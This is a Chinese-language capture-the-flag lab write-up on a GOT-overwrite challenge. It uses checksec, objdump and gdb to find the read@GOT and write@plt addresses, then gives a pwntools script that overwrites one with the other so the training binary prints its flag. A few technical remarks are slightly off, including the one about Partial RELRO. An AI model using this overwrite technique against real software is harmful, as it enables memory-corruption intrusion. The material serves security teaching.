# lab_got2win

1. 先用 checksec 檢查這個程式，RELRO 是 Partial RELRO ，代表.got 是唯讀。

![截圖 2022-12-01 下午8.02.55.png](lab_got2win%208d64de70c763419e8cb7126a7a246a3d/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25888.02.55.png)

1. 用objdump -R chal 稍微看一下 GOT 的資訊，這邊可以直接看到  function 的 Dynamic Relocation。

![截圖 2022-12-01 下午8.01.31.png](lab_got2win%208d64de70c763419e8cb7126a7a246a3d/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25888.01.31.png)

1. 接下來檢視檔案的 Source code，可以看到出這個檔案的行爲，會先將 “home/chal/flag” 檔案讀到 flag[0x30]，然後在“Overwrite addr“ 字串輸出後，你可以輸入一個 addr，“Overwrite 8 bytes valus : “字串輸入一個值，因為題目有說是 got2win，所以這題應該是可以利用這兩個 input 去蓋 got 。

![截圖 2022-12-01 下午8.07.23.png](lab_got2win%208d64de70c763419e8cb7126a7a246a3d/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25888.07.23.png)

1. 然後會發現在 printf(”Give me fake flag: “); 後面一行的 read是read(1,flag,0x30 )，而這邊如果把 read 改成 write.plt 的話，這邊就會變成 write(1,flag,0x30) ，然後就會變成 stdout 輸出題目的 flag 。所以接下來我們只要找到 read got 的位址及 write glt 的位址，就可以竄改 function 的 GOT。而 read got 可以從 table 中找到是在 0x404038，從 gdb 中能找到 write@plt 的位址是在 0x4010c0，

![截圖 2022-12-01 下午8.01.31.png](lab_got2win%208d64de70c763419e8cb7126a7a246a3d/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25888.01.31.png)

![截圖 2022-12-01 下午8.42.07.png](lab_got2win%208d64de70c763419e8cb7126a7a246a3d/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25888.42.07.png)

5.最後將 payload 送出就能得到 ctf{FLAG{apple_1f3870be274f6c49b3e31a0c6728957f}

```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 10004)

read_got = 0x404038
write_plt = 0x4010c0

r.sendlineafter('Overwrite addr: ', str(read_got))
r.sendafter('Overwrite 8 bytes value: ',p64(write_plt))

r.interactive()
```